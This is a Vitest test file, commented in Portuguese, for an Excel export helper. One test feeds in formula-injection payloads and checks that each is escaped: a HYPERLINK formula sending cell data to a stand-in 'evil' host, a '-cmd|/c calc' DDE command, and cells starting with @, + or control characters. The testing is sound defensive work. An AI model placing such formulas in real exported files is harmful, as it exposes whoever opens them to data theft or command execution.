/**
 * Testes do utilitário de exportação Excel (src/lib/export.ts)
 * A biblioteca xlsx é mockada para evitar escrita em disco.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import type { ExportRow } from "@/lib/export";

// Mock da biblioteca xlsx antes de importar exportToExcel
vi.mock("xlsx", () => {
  const jsonToSheet = vi.fn().mockReturnValue({ sheetData: true });
  const bookNew = vi.fn().mockReturnValue({ Sheets: {}, SheetNames: [] });
  const bookAppendSheet = vi.fn();
  const writeFile = vi.fn();
  return {
    default: {
      utils: { json_to_sheet: jsonToSheet, book_new: bookNew, book_append_sheet: bookAppendSheet },
      writeFile,
    },
    utils: { json_to_sheet: jsonToSheet, book_new: bookNew, book_append_sheet: bookAppendSheet },
    writeFile,
  };
});

describe("exportToExcel", () => {
  let writeFile: ReturnType<typeof vi.fn>;
  let bookAppendSheet: ReturnType<typeof vi.fn>;
  let jsonToSheet: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();
    const xlsx = await import("xlsx");
    writeFile = xlsx.writeFile as ReturnType<typeof vi.fn>;
    bookAppendSheet = xlsx.utils.book_append_sheet as ReturnType<typeof vi.fn>;
    jsonToSheet = xlsx.utils.json_to_sheet as ReturnType<typeof vi.fn>;
  });

  it("chama XLSX.writeFile com o nome de ficheiro correto (.xlsx)", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Score"];
    const rows: ExportRow[] = [{ Nome: "João", Score: 85 }];

    exportToExcel("relatorio-teste", headers, rows);

    expect(writeFile).toHaveBeenCalledOnce();
    expect(writeFile).toHaveBeenCalledWith(
      expect.anything(),
      "relatorio-teste.xlsx"
    );
  });

  it("chama json_to_sheet com os headers corretos", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Contador", "Nome", "Score"];
    const rows: ExportRow[] = [{ Contador: "C001", Nome: "Ana", Score: 60 }];

    exportToExcel("test", headers, rows);

    expect(jsonToSheet).toHaveBeenCalledOnce();
    const [, options] = jsonToSheet.mock.calls[0];
    expect(options.header).toEqual(headers);
  });

  it("ordena as colunas pelos headers fornecidos", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["A", "B", "C"];
    const rows: ExportRow[] = [{ C: 3, A: 1, B: 2 }]; // ordem errada intencionalmente

    exportToExcel("test", headers, rows);

    const [data] = jsonToSheet.mock.calls[0];
    expect(Object.keys(data[0])).toEqual(["A", "B", "C"]);
  });

  it("substitui valores undefined por null", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Score", "Obs"];
    const rows: ExportRow[] = [{ Nome: "Pedro", Score: 70 }]; // "Obs" em falta

    exportToExcel("test", headers, rows);

    const [data] = jsonToSheet.mock.calls[0];
    expect(data[0]["Obs"]).toBeNull();
  });

  it("cria a folha com o nome 'Dados'", async () => {
    const { exportToExcel } = await import("@/lib/export");
    exportToExcel("test", ["Col"], [{ Col: "val" }]);

    expect(bookAppendSheet).toHaveBeenCalledOnce();
    const [, , sheetName] = bookAppendSheet.mock.calls[0];
    expect(sheetName).toBe("Dados");
  });

  it("neutralises CSV/Excel formula triggers in string cells", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Tab", "Cr", "Score"];
    const rows: ExportRow[] = [{
      Contador: "=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
      Nota: "+1234567",
      Endereco: "-cmd|/c calc",
      Tipo: "@SUM(A1:A2)",
      Tab: "\tinjected",
      Cr: "\rinjected",
      Score: 85,
    }];

    exportToExcel("test", headers, rows);

    const [data] = jsonToSheet.mock.calls[0];
    expect(data[0].Contador).toBe("'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")");
    expect(data[0].Nota).toBe("'+1234567");
    expect(data[0].Endereco).toBe("'-cmd|/c calc");
    expect(data[0].Tipo).toBe("'@SUM(A1:A2)");
    expect(data[0].Tab).toBe("'\tinjected");
    expect(data[0].Cr).toBe("'\rinjected");
    // Numbers are passed through untouched.
    expect(data[0].Score).toBe(85);
  });

  it("does not modify benign string cells", async () => {
    const { exportToExcel } = await import("@/lib/export");
    const headers = ["Nome", "Morada"];
    const rows: ExportRow[] = [{ Nome: "Maria João", Morada: "Rua das Flores 12" }];

    exportToExcel("test", headers, rows);

    const [data] = jsonToSheet.mock.calls[0];
    expect(data[0].Nome).toBe("Maria João");
    expect(data[0].Morada).toBe("Rua das Flores 12");
  });
});
